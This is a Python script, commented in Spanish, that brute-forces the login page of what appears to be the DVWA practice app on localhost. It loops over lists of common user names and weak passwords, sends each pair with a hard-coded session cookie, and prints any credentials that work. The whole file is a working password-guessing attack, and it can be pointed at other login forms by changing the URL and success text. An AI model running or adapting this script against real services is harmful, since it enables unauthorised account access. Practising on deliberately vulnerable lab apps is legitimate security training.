import requests

# Tus detalles de sesión y URL
url = 'http://localhost:4280/vulnerabilities/brute/'
cookie = {'PHPSESSID': '79088205fc8b77cf07d33b14498e7b0c', 'security': 'low'}

# Lista de usuarios comunes y algunos incorrectos
usuarios = ['admin', 'gordonb', 'root', 'usuario1', 'invitado', 'test', 'invalidUser', 'prueba123', 'sysadmin']
contrasenas = ['password', '123456', 'admin123', 'abc123', 'root', 'letmein', 'pass123', 'incorrecta']

# Ataque de fuerza bruta
for usuario in usuarios:
    for contrasena in contrasenas:
        datos = {'username': usuario, 'password': contrasena, 'Login': 'Login'}
        respuesta = requests.get(url, params=datos, cookies=cookie)
        
        if "Welcome to the password protected area" in respuesta.text:
            print(f" Credenciales válidas encontradas: Usuario: {usuario}, Contraseña: {contrasena}")
            break
        else:
            print(f" Credenciales inválidas: Usuario: {usuario}, Contraseña: {contrasena}")
